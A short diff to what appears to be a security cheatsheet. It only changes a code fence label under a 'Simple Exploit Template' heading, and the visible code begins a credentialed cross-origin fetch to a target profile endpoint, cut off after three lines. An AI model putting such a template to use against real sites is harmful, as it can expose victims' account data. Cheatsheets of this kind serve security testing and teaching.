@@ -28,7 +28,7 @@ categories = ['cheatsheets']
 
 ## Simple Exploit Template
 
-```javascript
+```js
 fetch('https://target.app/api/profile', {
   credentials: 'include'
 })
